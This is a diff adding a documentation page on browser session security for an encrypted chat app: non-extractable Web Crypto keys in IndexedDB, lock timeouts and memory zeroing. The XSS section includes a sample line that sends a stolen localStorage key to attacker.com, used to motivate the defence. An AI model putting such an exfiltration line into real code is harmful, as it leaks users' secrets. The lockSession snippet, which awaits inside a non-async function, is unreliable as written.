@@ -1,0 +1,95 @@
+---
+title: Session Management
+description: Browser sessions and XSS protection with non-extractable keys
+---
+
+# Session Management
+
+## Session Key Architecture
+
+Browser sessions use the Web Crypto API's non-extractable keys for XSS protection:
+
+```mermaid
+flowchart TB
+    subgraph idb [IndexedDB Storage]
+        SK["Session Key (AES-GCM, 256-bit)<br/>- Generated with extractable: false<br/>- Cannot be exported via crypto.subtle.exportKey()<br/>- Encrypted master key only decryptable in-browser"]
+        
+        Data["Encrypted Master Key (ArrayBuffer)<br/>Encrypted Private Key (ArrayBuffer)<br/>Public Key (Uint8Array)<br/>Timestamps (createdAt, expiresAt)"]
+    end
+```
+
+## XSS Protection
+
+Traditional localStorage-based session storage is vulnerable to XSS attacks:
+
+```javascript
+// XSS attack can steal localStorage
+const stolen = localStorage.getItem('session_key');
+fetch('https://attacker.com/steal', { body: stolen });
+```
+
+With non-extractable keys:
+
+```javascript
+// Even with code execution, export fails
+const key = await getSessionKeyFromIndexedDB();
+await crypto.subtle.exportKey('raw', key);
+// Throws: InvalidAccessError: key is not extractable
+```
+
+## Session Lifecycle
+
+```mermaid
+stateDiagram-v2
+    [*] --> Locked
+    Locked --> Unlocked: User unlocks (password/passkey/recovery)
+    Unlocked --> Active: Keys decrypted, stored in memory<br/>Session persisted to IndexedDB<br/>Inactivity timer started
+    
+    Active --> Locked: Timeout (30min)
+    Active --> Locked: User action (manual lock)
+    Active --> Locked: Page unload (pagehide event)
+    Active --> Active: User activity resets timeout
+```
+
+## Session Configuration
+
+```typescript
+interface SecuritySettings {
+  sessionTimeoutMs: number;      // Default: 30 minutes
+  strictSessionLocking: boolean; // Clear on page hide
+}
+```
+
+## Memory Clearing
+
+On session lock:
+
+```typescript
+function lockSession() {
+  // Clear in-memory keys
+  if (decryptedKeys) {
+    sodium.memzero(decryptedKeys.masterKey);
+    sodium.memzero(decryptedKeys.privateKey);
+    decryptedKeys = null;
+  }
+
+  // Clear LRU cache
+  chatKeyCache.forEach((key) => sodium.memzero(key));
+  chatKeyCache.clear();
+
+  // Clear IndexedDB session
+  await clearIndexedDBSession();
+
+  // Update state
+  e2eeState = 'locked';
+}
+```
+
+## Security Guarantees
+
+| Threat | Protection |
+|--------|------------|
+| XSS key theft | Non-extractable Web Crypto keys |
+| Session hijacking | Keys bound to browser instance |
+| Idle session exposure | Automatic timeout after inactivity |
+| Memory dumping | Keys zeroed on lock |
